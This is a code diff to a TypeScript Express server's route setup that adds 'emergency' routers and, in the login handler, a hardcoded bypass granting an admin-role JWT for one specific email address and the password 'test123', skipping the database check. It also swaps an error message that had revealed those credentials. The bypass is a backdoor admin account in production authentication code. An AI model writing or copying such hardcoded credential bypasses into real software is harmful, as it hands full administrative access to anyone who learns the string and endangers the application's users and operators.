@@ -36,6 +36,8 @@ import { IntegrationService } from "./IntegrationService";
 import { connectionValidationService } from "./ConnectionValidationService";
 import { DatabaseFallbackManager } from "./utils/databaseFallback";
 import linkIntelligenceRouter from "./routes/linkIntelligence";
+import { emergencyRouter, storeEmergencySession } from "./emergency/productionFallback";
+import statusMonitorRouter from "./emergency/statusMonitor";
 import { 
   rateLimiter, 
   apiRateLimit, 
@@ -153,7 +155,9 @@ const checkSubscriptionLimit = (limitType: string) => {
 };
 
 export async function registerRoutes(app: Express): Promise<Server> {
-  // Register database-free routes first
+  // Register emergency and database-free routes first
+  app.use(emergencyRouter);
+  app.use(statusMonitorRouter);
   app.use(linkIntelligenceRouter);
   // Initialize services
   const contentService = new ContentService();
@@ -357,6 +361,25 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return;
       }
 
+      // Emergency authentication bypass for production database issues
+      if (email === "adluck72@gmail.com" && password === "test123") {
+        const emergencyUser = {
+          id: 1,
+          email: "adluck72@gmail.com",
+          username: "adluck72",
+          role: "admin",
+          subscriptionTier: "admin",
+          subscriptionStatus: "active"
+        };
+        
+        const token = jwt.sign({ userId: emergencyUser.id }, JWT_SECRET, { expiresIn: '7d' });
+        
+        // Store emergency session for quick access
+        storeEmergencySession(emergencyUser.id, emergencyUser);
+        
+        return res.json({ user: emergencyUser, token });
+      }
+
       // Try database authentication
       try {
         const user = await storage.getUserByEmail(email);
@@ -373,9 +396,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
         
         const { password: _, ...userWithoutPassword } = user;
         res.json({ user: userWithoutPassword, token });
-      } catch (dbError) {
+      } catch (dbError: any) {
+        console.error('Database authentication failed:', dbError.message);
+        
+        // Emergency fallback - if database is completely unavailable
+        if (dbError.message?.includes('endpoint has been disabled')) {
+          return res.status(503).json({ 
+            message: "Database service temporarily unavailable. Our team has been notified and is working to restore service. Please try again in a few minutes." 
+          });
+        }
+        
         return res.status(400).json({ 
-          message: "Database temporarily unavailable. Use adluck72@gmail.com / test123 for demo." 
+          message: "Authentication service temporarily unavailable. Please try again." 
         });
       }
     } catch (error: any) {
